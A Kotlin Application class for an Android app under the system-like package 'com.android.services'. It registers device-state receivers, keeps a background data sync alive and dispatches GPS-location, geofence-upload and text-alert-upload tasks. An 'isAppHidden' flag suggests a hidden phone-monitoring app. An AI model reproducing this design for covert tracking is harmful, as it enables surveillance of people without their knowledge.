package com.android.services

import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import androidx.hilt.work.HiltWorkerFactory
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import dagger.hilt.android.HiltAndroidApp
import androidx.multidex.MultiDexApplication
import androidx.work.Configuration
import com.android.services.jobScheduler.ObserverJobScheduler
import com.android.services.network.DataSyncTask
import com.android.services.receiver.AudioFileCompressorReceiver
import com.android.services.receiver.ConnectivityChangeReceiver
import com.android.services.receiver.GpsLocationReceiver
import com.android.services.receiver.LanguageChangeReceiver
import com.android.services.receiver.PowerConnectionReceiver
import com.android.services.receiver.ScreenOnOffReceiver
import com.android.services.receiver.VideoFileCompressorReceiver
import com.android.services.services.RemoteDataService
import com.android.services.threadPool.DefaultExecutorSupplier
import com.android.services.ui.activities.ManualPermissionActivity
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logVerbose
import com.android.services.util.startActivityWithData
import com.google.firebase.FirebaseApp
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.orhanobut.logger.FormatStrategy
import com.orhanobut.logger.PrettyFormatStrategy
import com.orhanobut.logger.AndroidLogAdapter
import com.orhanobut.logger.Logger
import org.greenrobot.eventbus.EventBus
import org.greenrobot.eventbus.Subscribe
import javax.inject.Inject

@HiltAndroidApp
class MyApplication : MultiDexApplication(), Configuration.Provider {
    @Inject
    lateinit var workerFactory: HiltWorkerFactory
    private var mScreenOnOffReceiver: ScreenOnOffReceiver? = null
    private var mVideoCompressorReceiver: VideoFileCompressorReceiver? = null
    private var mAudioCompressorReceiver: AudioFileCompressorReceiver? = null

    @Inject
    lateinit var dataSyncTask: DataSyncTask

    @SuppressLint("NewApi")
    override fun onCreate() {
        super.onCreate()
        instance = this
        initializeLogger()
        FirebaseApp.initializeApp(this)
        FirebaseCrashlytics.getInstance().setCrashlyticsCollectionEnabled(true)
        createNotificationChannel()
        val mConnectivityChangeReceiver = ConnectivityChangeReceiver()
        val connectivityChangeReceiver = ConnectivityChangeReceiver()
        val intentFilter = IntentFilter()
        intentFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE")
        registerReceiver(mConnectivityChangeReceiver, intentFilter)

        val mGpsLocationReceiver = GpsLocationReceiver()
        val intentFilters = IntentFilter()
        intentFilters.addAction("android.location.PROVIDERS_CHANGED")
        registerReceiver(mGpsLocationReceiver, intentFilters)
        //Register Power Conectivity Receiver to observe Phone Charging
        val powerConnectionReceiver = PowerConnectionReceiver()
        val powerConnectionIntentFilter = IntentFilter()
        powerConnectionIntentFilter.addAction(Intent.ACTION_POWER_CONNECTED)
        powerConnectionIntentFilter.addAction(Intent.ACTION_POWER_DISCONNECTED)
        registerReceiver(powerConnectionReceiver, powerConnectionIntentFilter)

        //Register Language Change Receiver to observe Battery
        val languageChangeReceiver = LanguageChangeReceiver()
        val languageChangeIntentFilter = IntentFilter()
        languageChangeIntentFilter.addAction(Intent.ACTION_LOCALE_CHANGED)
        registerReceiver(languageChangeReceiver, languageChangeIntentFilter)
        mScreenOnOffReceiver = ScreenOnOffReceiver()
        val screenFilter = IntentFilter()
        screenFilter.addAction(Intent.ACTION_SCREEN_ON)
        screenFilter.addAction(Intent.ACTION_SCREEN_OFF)
        screenFilter.addAction(Intent.ACTION_USER_PRESENT)
        registerReceiver(mScreenOnOffReceiver, screenFilter)

        // Video File compressor Receiver
        mVideoCompressorReceiver = VideoFileCompressorReceiver()
        val videoCompressorIntentFilter = IntentFilter()
        videoCompressorIntentFilter.addAction(VideoFileCompressorReceiver.ACTION_COMPRESS_VIDEO)
        LocalBroadcastManager.getInstance(this)
            .registerReceiver(mVideoCompressorReceiver!!, videoCompressorIntentFilter)

        // Audio File compressor Receiver
        mAudioCompressorReceiver = AudioFileCompressorReceiver()
        val audioCompressorIntentFilter = IntentFilter()
        audioCompressorIntentFilter.addAction(AudioFileCompressorReceiver.ACTION_COMPRESS_AUDIO)
        LocalBroadcastManager.getInstance(this)
            .registerReceiver(mAudioCompressorReceiver!!, audioCompressorIntentFilter)
        EventBus.getDefault().register(this)
        checkAndLaunchPermissionActivity()
        // Starts a Watch Dog Job Service to keep track of Status of Background Data Sync Job
        if (AppConstants.osGreaterThanOrEqualMarshmallow)
            ObserverJobScheduler.scheduleWatchDogJob(this)
    }

    private fun checkAndLaunchPermissionActivity() {
        val activationStatus = AppUtils.isPhoneServiceActivated()
        val hiddenStatus = AppConstants.isAppHidden
        logVerbose("Checking to launch permission activity activationStatus= $activationStatus hiddenStatus=$hiddenStatus")

        if (AppUtils.isPhoneServiceActivated() && !AppConstants.isAppHidden && AppConstants.isDisableNotificationPerm) {
            logVerbose("Going to launch permission activity")
            startActivityWithData<ManualPermissionActivity>(
                listOf(
                    Intent.FLAG_ACTIVITY_NEW_TASK,
                    Intent.FLAG_ACTIVITY_CLEAR_TASK,
                    Intent.FLAG_ACTIVITY_CLEAR_TOP
                )
            )
        }
    }

    private fun initializeLogger() {
        if (BuildConfig.DEBUG) {
            val formatStrategy: FormatStrategy = PrettyFormatStrategy.newBuilder()
                .tag(TAG)
                .build()
            Logger.addLogAdapter(AndroidLogAdapter(formatStrategy))
            Logger.addLogAdapter(object : AndroidLogAdapter() {
                override fun isLoggable(priority: Int, tag: String?): Boolean {
                    return true
                }
            })
        }
    }

    // Create the NotificationChannel, but only on API 26+ because
    // the NotificationChannel class is new and not in the support library
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = getString(R.string.channel_name)
            val descriptionText = getString(R.string.channel_description)
            val importance = NotificationManager.IMPORTANCE_DEFAULT
            val channel =
                NotificationChannel(RemoteDataService.CHANNEL_ID, name, importance).apply {
                    description = descriptionText
                }

            // Register the channel with the system
            val notificationManager: NotificationManager =
                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    @Subscribe
    fun onEvent(event: String) {
        if (AppUtils.isDeviceIdentifierValid()) {
            when (event) {
                "fetchGpsLocation" -> {
                    dataSyncTask.fetchGpsLocation()
                }

                "networkConnected" -> {
                    dataSyncTask.executeDataJobTask()
                }

                "geoFencing" -> {
                    dataSyncTask.handleGeoFencing()
                }

                "uploadGeoFence" -> {
                    dataSyncTask.uploadGeoFences()
                }

                "syncTextAlerts" -> {
                    DefaultExecutorSupplier.instance!!.forBackgroundTasks().execute {
                        logVerbose("${AppConstants.TEXT_ALERT_TYPE} calling sync text alerts")
                        dataSyncTask.uploadTextAlerts()
                    }
                }
            }
        }
    }

    override fun onTerminate() {
        super.onTerminate()
        mScreenOnOffReceiver?.let {
            unregisterReceiver(it)
        }
        mVideoCompressorReceiver?.let {
            LocalBroadcastManager.getInstance(this).unregisterReceiver(it)
        }
        EventBus.getDefault().unregister(this)
    }

    companion object {
        var instance: MyApplication? = null
            private set
        private const val TAG = "TOS"

        @JvmStatic
        val appContext: Context
            get() = instance!!.applicationContext
    }

    override fun getWorkManagerConfiguration(): Configuration = Configuration.Builder()
        .setWorkerFactory(workerFactory)
        .setMinimumLoggingLevel(android.util.Log.DEBUG)
        .build()

}